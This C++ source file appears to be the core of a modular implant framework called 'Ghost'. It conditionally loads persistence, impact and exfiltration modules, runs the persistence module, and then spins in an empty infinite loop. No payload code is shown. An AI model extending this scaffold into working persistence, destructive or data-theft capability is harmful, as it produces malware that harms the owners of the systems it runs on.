#include "core/Ghost.hpp"
#include "utils/Logger.hpp"

#ifdef FEATURE_PERSISTENCE
    #include "modules/Persistence.hpp"
#endif
#ifdef FEATURE_IMPACT
    #include "modules/Impact.hpp"
#endif
#ifdef FEATURE_EXFIL
    #include "modules/Exfiltration.hpp"
#endif

Ghost::Ghost() {
    #ifdef FEATURE_PERSISTENCE
    modules["PERSIST"] = std::make_unique<Persistence>();
    #endif

    #ifdef FEATURE_IMPACT
    modules["IMPACT"] = std::make_unique<Impact>();
    #endif

    #ifdef FEATURE_EXFIL
    modules["EXFIL"] = std::make_unique<Exfiltration>();
    #endif
}

void Ghost::run() {
    if (modules.contains("PERSIST")) {
        modules["PERSIST"]->execute();
    }

    while (true) {
        
    }
}
